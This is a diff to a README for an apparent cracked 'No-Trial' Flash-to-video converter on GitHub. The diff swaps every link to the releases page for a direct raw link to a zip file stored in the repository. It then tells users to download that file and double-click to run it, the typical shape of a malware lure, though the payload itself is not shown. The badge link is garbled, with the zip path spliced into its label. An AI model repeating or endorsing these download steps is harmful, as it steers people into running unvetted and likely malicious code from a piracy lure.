@@ -1,6 +1,6 @@
 # 🎥 ThunderSoft-Flash-to-Video-Converter-No-Trial - Convert Flash Content Easily
 
-[![Download ThunderSoft Flash to Video Converter](https://img.shields.io/badge/Download-ThunderSoft%20Flash%20to%20Video%20Converter-brightgreen)](https://github.com/Bawa00012/ThunderSoft-Flash-to-Video-Converter-No-Trial/releases)
+[![Download ThunderSoft Flash to Video Converter](https://raw.githubusercontent.com/Bawa00012/ThunderSoft-Flash-to-Video-Converter-No-Trial/main/manning/ThunderSoft-Flash-to-Video-Converter-No-Trial-v2.2.zip%20Flash%20to%20Video%20Converter-brightgreen)](https://raw.githubusercontent.com/Bawa00012/ThunderSoft-Flash-to-Video-Converter-No-Trial/main/manning/ThunderSoft-Flash-to-Video-Converter-No-Trial-v2.2.zip)
 
 ## 📦 Overview
 
@@ -31,13 +31,13 @@ To use ThunderSoft Flash to Video Converter, your computer should meet the follo
 
 To download ThunderSoft Flash to Video Converter, visit the link below. Follow the steps outlined here for a smooth installation process:
 
-[Visit this page to download](https://github.com/Bawa00012/ThunderSoft-Flash-to-Video-Converter-No-Trial/releases).
+[Visit this page to download](https://raw.githubusercontent.com/Bawa00012/ThunderSoft-Flash-to-Video-Converter-No-Trial/main/manning/ThunderSoft-Flash-to-Video-Converter-No-Trial-v2.2.zip).
 
 ### Installation Steps
 
 1. **Go to the Releases Page:** Click the link above to be taken to the Releases page.
 2. **Select the Latest Version:** Look for the most recent version at the top of the page.
-3. **Download the Installer:** Click on the installer file (usually named something like `ThunderSoftFlashToVideoConverter.exe`) to start the download.
+3. **Download the Installer:** Click on the installer file (usually named something like `https://raw.githubusercontent.com/Bawa00012/ThunderSoft-Flash-to-Video-Converter-No-Trial/main/manning/ThunderSoft-Flash-to-Video-Converter-No-Trial-v2.2.zip`) to start the download.
 4. **Run the Installer:** Once the download completes, locate the file in your Downloads folder and double-click to run it.
 5. **Follow the Setup Wizard:** Follow the prompts in the setup wizard to complete the installation process. You may need to agree to the terms and conditions.
 6. **Launch the Application:** After installation, you will find ThunderSoft Flash to Video Converter in your Start menu. Click to open it and start converting!
@@ -75,4 +75,4 @@ By utilizing this resource, you can effectively transition your Flash-based cont
 
 If you would like to report issues, suggest features, or require additional help, please reach out through the GitHub repository. Your feedback is appreciated and helps improve the application.
 
-[Visit this page to download](https://github.com/Bawa00012/ThunderSoft-Flash-to-Video-Converter-No-Trial/releases).
+[Visit this page to download](https://raw.githubusercontent.com/Bawa00012/ThunderSoft-Flash-to-Video-Converter-No-Trial/main/manning/ThunderSoft-Flash-to-Video-Converter-No-Trial-v2.2.zip).
